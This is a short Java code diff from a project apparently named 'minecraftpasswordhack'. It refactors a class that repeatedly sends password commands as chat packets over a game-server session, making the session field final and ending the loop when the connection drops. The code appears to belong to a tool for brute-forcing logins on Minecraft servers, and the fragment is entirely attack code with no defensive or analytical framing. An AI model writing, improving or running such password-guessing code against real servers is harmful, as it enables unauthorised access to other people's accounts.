@@ -8,7 +8,7 @@ import xyz.minecraftpasswordhack.utils.PasswordUtil;
 
 public class PasswordSending implements Runnable {
 
-	private Session session;
+	private final Session session;
 	
 	public PasswordSending(Session session) {
 		this.session = session;
@@ -16,7 +16,7 @@ public class PasswordSending implements Runnable {
 
 	@Override
 	public void run() {
-		while (true) {
+		while (session.isConnected()) {
 			if (!PasswordUtil.getPasswordCommand().equals("KONIEC_TEGO")) {
 				session.send(new ClientChatPacket(PasswordUtil.getPasswordCommand()));
 				try {
